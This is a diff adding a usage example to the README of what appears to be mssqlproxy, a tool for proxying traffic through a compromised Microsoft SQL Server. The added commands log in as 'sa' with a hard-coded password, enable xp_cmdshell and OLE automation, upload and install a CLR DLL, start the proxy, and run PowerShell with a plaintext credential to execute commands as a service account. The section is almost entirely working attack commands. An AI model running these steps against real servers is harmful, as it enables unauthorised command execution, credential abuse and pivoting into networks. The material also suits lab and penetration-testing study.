@@ -74,6 +74,35 @@ Once the proxy is started, you can plug in your proxychains ;)
 **Important:** It's important to stop the mssqlproxy by pressing Ctrl+C on the client. If not, the server may crash and you will have to restart the MSSQL service manually.
 
 
+Example
+------------
+
+Prepare
+```bash
+mv assembly.dll Microsoft.SqlServer.Proxy.dll
+export username='sa'
+export password='#mssql_s3rV1c3!2020'
+export ip_mssql='10.10.10.240'
+python3 mssqlclient.py $username:$password@$ip_mssql
+SQL> enable_xp_cmdshell
+SQL> enable_ole
+SQL> upload reciclador.dll c:\windows\temp\reciclador.dll
+SQL> exit
+```
+
+Proxy
+```bash
+python3 mssqlclient.py $username:$password@$ip_mssql -install -clr Microsoft.SqlServer.Proxy.dll
+python3 mssqlclient.py $username:$password@$ip_mssql -check -reciclador 'c:\windows\temp\reciclador.dll'
+python3 mssqlclient.py $username:$password@$ip_mssql -start -reciclador 'c:\windows\temp\reciclador.dll'
+```
+
+xp_cmdshell
+```bash
+SQL> xp_cmdshell whoami /all
+SQL> powershell -c "$pass = convertto-securestring '#mssql_s3rV1c3!2020' -asplaintext -force;$cred = new-object system.management.automation.pscredential('licordebellota\svc_mssql', $pass);invoke-command -computername 127.0.0.1 -credential $cred -scriptblock {whoami}"
+```
+
 
 Authors
 ---------------
